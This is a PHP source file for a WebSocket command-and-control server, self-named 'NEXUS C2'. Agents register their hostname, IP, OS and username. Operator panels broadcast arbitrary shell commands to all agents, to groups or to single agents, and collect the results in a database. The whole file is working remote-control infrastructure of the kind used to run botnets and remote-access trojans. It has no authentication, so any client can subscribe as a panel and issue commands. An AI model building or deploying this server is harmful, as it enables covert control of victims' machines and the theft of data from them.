<?php

require_once __DIR__ . '/../includes/config.php';
require_once __DIR__ . '/../includes/database.php';

use Ratchet\MessageComponentInterface;
use Ratchet\ConnectionInterface;

class C2Server implements MessageComponentInterface {
    protected $panels;
    protected $agents;
    protected $agentConnections;

    public function __construct() {
        $this->panels = new \SplObjectStorage;
        $this->agents = new \SplObjectStorage;
        $this->agentConnections = [];
        echo "[*] NEXUS C2 Server initialized\n";
    }

    public function onOpen(ConnectionInterface $conn) {
        echo "[+] New connection: {$conn->resourceId}\n";
    }

    public function onMessage(ConnectionInterface $from, $msg) {
        $data = json_decode($msg, true);
        if (!$data || !isset($data['type'])) return;

        switch ($data['type']) {
            case 'panel_subscribe':
                $this->panels->attach($from);
                echo "[*] Panel subscribed: {$from->resourceId}\n";
                $this->sendAgentList($from);
                break;

            case 'agent_register':
                $this->handleAgentRegister($from, $data);
                break;

            case 'agent_heartbeat':
                $this->handleAgentHeartbeat($from, $data);
                break;

            case 'send_command':
                $this->handleSendCommand($from, $data);
                break;

            case 'command_result':
                $this->handleCommandResult($from, $data);
                break;
        }
    }

    protected function handleAgentRegister(ConnectionInterface $conn, $data) {
        $agentId = $data['agent_id'] ?? null;
        if (!$agentId) return;

        $this->agents->attach($conn);
        $this->agentConnections[$agentId] = $conn;
        $conn->agentId = $agentId;

        try {
            $pdo = db();
            $stmt = $pdo->prepare("SELECT id FROM agents WHERE id = ?");
            $stmt->execute([$agentId]);
            
            if ($stmt->fetch()) {
                $stmt = $pdo->prepare("UPDATE agents SET hostname = ?, ip = ?, os = ?, username = ?, status = 'online', last_seen = datetime('now') WHERE id = ?");
                $stmt->execute([
                    $data['hostname'] ?? '',
                    $data['ip'] ?? '',
                    $data['os'] ?? '',
                    $data['username'] ?? '',
                    $agentId
                ]);
            } else {
                $stmt = $pdo->prepare("INSERT INTO agents (id, hostname, ip, os, username, status, last_seen) VALUES (?, ?, ?, ?, ?, 'online', datetime('now'))");
                $stmt->execute([
                    $agentId,
                    $data['hostname'] ?? '',
                    $data['ip'] ?? '',
                    $data['os'] ?? '',
                    $data['username'] ?? ''
                ]);
            }
        } catch (Exception $e) {
            echo "[!] DB Error: {$e->getMessage()}\n";
        }

        $agentData = [
            'id' => $agentId,
            'hostname' => $data['hostname'] ?? '',
            'ip' => $data['ip'] ?? '',
            'os' => $data['os'] ?? '',
            'username' => $data['username'] ?? '',
            'status' => 'online'
        ];

        $this->broadcastToPanels([
            'type' => 'agent_connected',
            'agent' => $agentData
        ]);

        echo "[+] Agent registered: {$agentId}\n";
    }

    protected function handleAgentHeartbeat(ConnectionInterface $conn, $data) {
        $agentId = $conn->agentId ?? $data['agent_id'] ?? null;
        if (!$agentId) return;

        try {
            $stmt = db()->prepare("UPDATE agents SET last_seen = datetime('now'), status = 'online' WHERE id = ?");
            $stmt->execute([$agentId]);
        } catch (Exception $e) {}
    }

    protected function handleSendCommand(ConnectionInterface $from, $data) {
        $target = $data['target'] ?? '';
        $targetType = $data['target_type'] ?? '';
        $command = $data['command'] ?? '';
        $commandId = $data['command_id'] ?? '';

        if (empty($command)) return;

        $targetAgents = [];

        if ($targetType === 'all') {
            foreach ($this->agentConnections as $id => $conn) {
                $targetAgents[$id] = $conn;
            }
        } elseif ($targetType === 'group') {
            try {
                $stmt = db()->prepare("SELECT id FROM agents WHERE group_id = ? AND status = 'online'");
                $stmt->execute([$target]);
                while ($row = $stmt->fetch()) {
                    if (isset($this->agentConnections[$row['id']])) {
                        $targetAgents[$row['id']] = $this->agentConnections[$row['id']];
                    }
                }
            } catch (Exception $e) {}
        } elseif ($targetType === 'agent') {
            if (isset($this->agentConnections[$target])) {
                $targetAgents[$target] = $this->agentConnections[$target];
            }
        }

        foreach ($targetAgents as $agentId => $conn) {
            try {
                $stmt = db()->prepare("INSERT INTO commands (agent_id, command, status) VALUES (?, ?, 'pending')");
                $stmt->execute([$agentId, $command]);
                $dbCommandId = db()->lastInsertId();
            } catch (Exception $e) {
                $dbCommandId = 0;
            }

            $conn->send(json_encode([
                'type' => 'execute_command',
                'command_id' => $commandId,
                'db_command_id' => $dbCommandId,
                'command' => $command
            ]));
        }

        echo "[>] Command sent to " . count($targetAgents) . " agent(s)\n";
    }

    protected function handleCommandResult(ConnectionInterface $from, $data) {
        $agentId = $from->agentId ?? '';
        $commandId = $data['command_id'] ?? '';
        $dbCommandId = $data['db_command_id'] ?? 0;
        $result = $data['result'] ?? '';
        $error = $data['error'] ?? null;

        if ($dbCommandId) {
            try {
                $stmt = db()->prepare("UPDATE commands SET result = ?, status = 'completed', completed_at = datetime('now') WHERE id = ?");
                $stmt->execute([$error ? "[ERROR] $error" : $result, $dbCommandId]);
            } catch (Exception $e) {}
        }

        $this->broadcastToPanels([
            'type' => 'command_result',
            'command_id' => $commandId,
            'agent_id' => $agentId,
            'result' => $result,
            'error' => $error
        ]);
    }

    protected function sendAgentList(ConnectionInterface $conn) {
        try {
            $stmt = db()->query("SELECT a.*, g.name as group_name, g.color as group_color FROM agents a LEFT JOIN groups g ON a.group_id = g.id");
            $agents = $stmt->fetchAll();
            
            foreach ($agents as &$agent) {
                $agent['status'] = isset($this->agentConnections[$agent['id']]) ? 'online' : 'offline';
            }
            
            $conn->send(json_encode([
                'type' => 'agent_list',
                'agents' => $agents
            ]));
        } catch (Exception $e) {}
    }

    protected function broadcastToPanels($data) {
        $msg = json_encode($data);
        foreach ($this->panels as $panel) {
            $panel->send($msg);
        }
    }

    public function onClose(ConnectionInterface $conn) {
        if ($this->panels->contains($conn)) {
            $this->panels->detach($conn);
            echo "[-] Panel disconnected: {$conn->resourceId}\n";
        }

        if ($this->agents->contains($conn)) {
            $this->agents->detach($conn);
            $agentId = $conn->agentId ?? '';
            
            if ($agentId && isset($this->agentConnections[$agentId])) {
                unset($this->agentConnections[$agentId]);
                
                try {
                    $stmt = db()->prepare("UPDATE agents SET status = 'offline', last_seen = datetime('now') WHERE id = ?");
                    $stmt->execute([$agentId]);
                } catch (Exception $e) {}
                
                $this->broadcastToPanels([
                    'type' => 'agent_disconnected',
                    'agent_id' => $agentId
                ]);
                
                echo "[-] Agent disconnected: {$agentId}\n";
            }
        }
    }

    public function onError(ConnectionInterface $conn, \Exception $e) {
        echo "[!] Error: {$e->getMessage()}\n";
        $conn->close();
    }
}
